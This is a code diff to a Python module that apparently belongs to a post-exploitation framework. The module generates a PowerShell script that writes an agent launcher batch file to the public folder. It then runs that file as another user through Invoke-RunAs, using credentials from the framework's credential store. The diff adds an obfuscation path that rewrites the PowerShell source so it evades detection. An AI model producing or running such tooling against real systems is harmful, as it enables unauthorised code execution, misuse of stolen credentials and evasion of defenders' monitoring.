@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -14,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1'
             ]
@@ -38,7 +39,7 @@ class Module:
             'CredID' : {
                 'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   ''                
+                'Value'         :   ''
             },
             'Domain' : {
                 'Description'   :   'Optional domain.',
@@ -80,7 +81,7 @@ class Module:
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -88,11 +89,14 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
-        # read in the common powerup.ps1 module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"
+        if obfuscate:
+            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/management/Invoke-RunAs.ps1"
+            if not self.is_obfuscated():
+                self.obfuscate(obfuscationCommand=obfuscationCommand)
         try:
             f = open(moduleSource, 'r')
         except:
@@ -105,7 +109,7 @@ class Module:
         # if a credential ID is specified, try to parse
         credID = self.options["CredID"]['Value']
         if credID != "":
-            
+
             if not self.mainMenu.credentials.is_credential_valid(credID):
                 print helpers.color("[!] CredID is invalid!")
                 return ""
@@ -141,7 +145,7 @@ class Module:
         script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
         script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
         script += "\"Launcher bat written to $tempLoc `n\";\n"
-  
+
         script += "\nInvoke-RunAs "
         script += "-UserName %s " %(self.options["UserName"]['Value'])
         script += "-Password %s " %(self.options["Password"]['Value'])
@@ -153,3 +157,33 @@ class Module:
         script += "-Cmd \"$env:public\debug.bat\""
 
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        if self.is_obfuscated() and not forceReobfuscation:
+            return
+
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-RunAs.ps1"
+        try:
+            f = open(moduleSource, 'r')
+        except:
+            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            return ""
+
+        moduleCode = f.read()
+        f.close()
+
+        # obfuscate and write to obfuscated source path
+        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/management/Invoke-RunAs.ps1"
+        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+        try:
+            f = open(obfuscatedSource, 'w')
+        except:
+            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
+            return ""
+        f.write(obfuscatedCode)
+        f.close()
+
+    def is_obfuscated(self):
+        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/management/Invoke-RunAs.ps1"
+        return os.path.isfile(obfuscatedSource)
